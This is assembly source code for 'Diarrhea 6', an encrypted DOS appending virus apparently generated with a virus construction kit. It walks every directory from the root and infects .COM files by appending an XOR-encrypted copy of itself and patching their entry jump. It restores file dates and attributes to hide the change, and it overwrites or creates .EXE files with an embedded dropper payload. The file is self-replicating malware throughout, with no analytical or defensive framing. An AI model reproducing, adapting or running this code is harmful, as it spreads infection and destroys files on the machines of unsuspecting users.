; DIARRHE6.ASM -- DIARRHEA 6
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by URNST KOUCH

virus_type      equ     0                       ; Appending Virus
is_encrypted    equ     1                       ; We're encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

main            proc    near
		db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
		sub     bp,offset find_offset   ; Adjust for length of host

		call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h

		call    search_files            ; Find and infect a file
		call    search_files            ; Find and infect another file
		lea     dx,[di + data00]        ; DX points to data
		lea     si,[di + data01]        ; SI points to data
		push    di                      ; Save DI
		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		mov     di,bx                   ; DI points to DTA
		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		int     021h
		jc      create_file             ; If not found then create it
write_in_file:  mov     ax,04301h               ; DOS set file attributes function
		xor     cx,cx                   ; File will have no attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ax,03D01h               ; DOS open file function, write
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ax,05701h               ; DOS set file date/time function
		mov     cx,[di + 016h]          ; CX holds old file time
		mov     dx,[di + 018h]          ; DX holds old file data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		mov     ax,04301h               ; DOS set file attributes function
		xor     ch,ch                   ; Clear CH for attributes
		mov     cl,[di + 015h]          ; CL holds old attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ah,04Fh                 ; DOS find next file function
		int     021h
		jnc     write_in_file           ; If successful do next file
		jmp     short dropper_end       ; Otherwise exit
create_file:    mov     ah,03Ch                 ; DOS create file function
		xor     cx,cx                   ; File has no attributes
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
dropper_end:    pop     di                      ; Restore DI


com_end:        pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + root]          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		lea     dx,[di + all_files]     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + up_dir]        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		lea     dx,[di + com_mask]      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.COM",0               ; Mask for all .COM files
traverse        endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		push    si                      ; Save SI through call
		call    encrypt_code            ; Write an encrypted copy
		pop     si                      ; Restore SI

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


data00            db   "*.EXE",0

data01          dw       189h
                db       0E9h, 0A1h, 000h, 00Ah, 045h, 064h, 064h, 069h
                db       065h, 020h, 06Ch, 069h, 076h, 065h, 073h, 020h
                db       02Eh, 020h, 02Eh, 020h, 02Eh, 020h, 073h, 06Fh
                db       06Dh, 065h, 077h, 068h, 065h, 072h, 065h, 020h
                db       069h, 06Eh, 020h, 074h, 069h, 06Dh, 065h, 021h
                db       020h, 020h, 057h, 072h, 069h, 074h, 074h, 065h
                db       06Eh, 020h, 069h, 06Eh, 020h, 074h, 068h, 065h
                db       020h, 063h, 069h, 074h, 079h, 020h, 06Fh, 066h
                db       053h, 06Fh, 066h, 069h, 061h, 02Ch, 020h, 042h
                db       075h, 06Ch, 067h, 061h, 072h, 069h, 061h, 020h
                db       02Eh, 02Eh, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
                db       020h, 00Ah, 00Ah, 00Dh, 0B4h, 040h, 0BBh, 001h
                db       000h, 0B9h, 0A0h, 000h, 0BAh, 004h, 001h, 0CDh
                db       021h, 0E8h, 000h, 000h, 0B8h, 000h, 04Ch, 0CDh
                db       021h, 071h, 0E1h, 0A7h, 086h, 038h, 0B8h, 084h
                db       041h, 025h, 0B3h, 0B5h, 04Eh, 00Ah, 05Fh, 0F7h
                db       0BCh, 097h, 0D7h, 0DFh, 02Fh, 0E4h, 040h, 0DAh
                db       0E2h, 008h, 005h, 0F0h, 005h, 03Ah, 050h, 047h
                db       04Bh, 033h, 0E0h, 068h, 076h, 032h, 0B6h, 075h
                db       0ADh, 055h, 0CFh, 04Eh, 06Ch, 00Eh, 01Fh, 0E8h
                db       0F7h, 0FFh, 081h, 0EBh, 0A3h, 023h, 0B9h, 0C1h
                db       011h, 08Bh, 017h, 043h, 043h, 042h, 0A7h, 0E7h
                db       067h, 017h, 048h, 0AFh, 03Bh, 021h, 058h, 04Eh
                db       0A8h, 031h, 0E7h, 0DBh, 098h, 0E1h, 0B2h, 02Eh
                db       05Bh, 069h, 03Ch, 087h, 0B5h, 0A4h, 042h, 09Eh
                db       0C7h, 0B7h, 0A7h, 0ACh, 041h, 09Dh, 0E1h, 084h
                db       080h, 0DAh, 0EEh, 04Fh, 02Fh, 0C9h, 0F4h, 0E1h
                db       0E1h, 0ACh, 08Ah, 06Fh, 0B8h, 055h, 04Bh, 0CDh
                db       021h, 03Dh, 031h, 012h, 074h, 076h, 0B8h, 021h
                db       0EBh, 0CFh, 05Fh, 0D3h, 0C4h, 03Dh, 02Eh, 050h
                db       0C2h, 072h, 00Fh, 0CDh, 04Bh, 0DEh, 036h, 0A1h
                db       087h, 076h, 080h, 018h, 015h, 075h, 06Ah, 018h
                db       0A3h, 040h, 004h, 04Bh, 000h, 081h, 0CDh, 069h
                db       0AFh, 074h, 037h, 01Ah, 08Ch, 094h, 0A9h, 01Fh
                db       0A7h, 0A3h, 0B4h, 040h, 02Eh, 08Bh, 01Eh, 07Dh
                db       003h, 0B9h, 006h, 000h, 0BAh, 095h, 003h, 0CDh
                db       021h, 0B8h, 002h, 042h, 02Eh, 08Bh, 01Eh, 07Dh
                db       003h, 031h, 0C9h, 031h, 0D2h, 0CDh, 021h, 046h
                db       0B3h, 021h, 0FEh, 0ACh, 068h, 045h, 09Eh, 0EFh
                db       006h, 08Ch, 02Ch, 0D8h, 06Bh, 0E0h, 0E7h, 00Fh
                db       000h

vcl_marker      db      "[VCL]",0               ; VCL creation marker

encrypt_code    proc    near
		push    bp                      ; Save BP
		mov     bp,di                   ; Use BP as pointer to code
		lea     si,[bp + encrypt_decrypt]; SI points to cipher routine

		xor     ah,ah                   ; BIOS get time function
		int     01Ah
		mov     word ptr [si + 9],dx    ; Low word of timer is new key

		xor     byte ptr [si + 1],8     ;
		xor     byte ptr [si + 8],1     ; Change all SIs to DIs
		xor     word ptr [si + 11],0101h; (and vice-versa)

		lea     di,[bp + finish]        ; Copy routine into heap
		mov     cx,finish - encrypt_decrypt - 1  ; All but final RET
		push    si                      ; Save SI for later
		push    cx                      ; Save CX for later
	rep     movsb                           ; Copy the bytes

		lea     si,[bp + write_stuff]   ; SI points to write stuff
		mov     cx,5                    ; CX holds length of write
	rep     movsb                           ; Copy the bytes

		pop     cx                      ; Restore CX
		pop     si                      ; Restore SI
		inc     cx                      ; Copy the RET also this time
	rep     movsb                           ; Copy the routine again

		mov     ah,040h                 ; DOS write to file function
		lea     dx,[bp + start]         ; DX points to virus

		lea     si,[bp + finish]        ; SI points to routine
		call    si                      ; Encrypt/write/decrypt

		mov     di,bp                   ; DI points to virus again
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

write_stuff:    mov     cx,finish - start       ; Length of code
		int     021h
encrypt_code    endp

end_of_code     label   near

encrypt_decrypt proc    near
		lea     si,[bp + start_of_code] ; SI points to code to decrypt
		mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       db      081h,034h,00h,00h       ; XOR a word by the key
		inc     si                      ; Do the next word
		inc     si                      ;
		loop    xor_loop                ; Loop until we're through
		ret                             ; Return to caller
encrypt_decrypt endp
finish          label   near

code            ends
		end     main
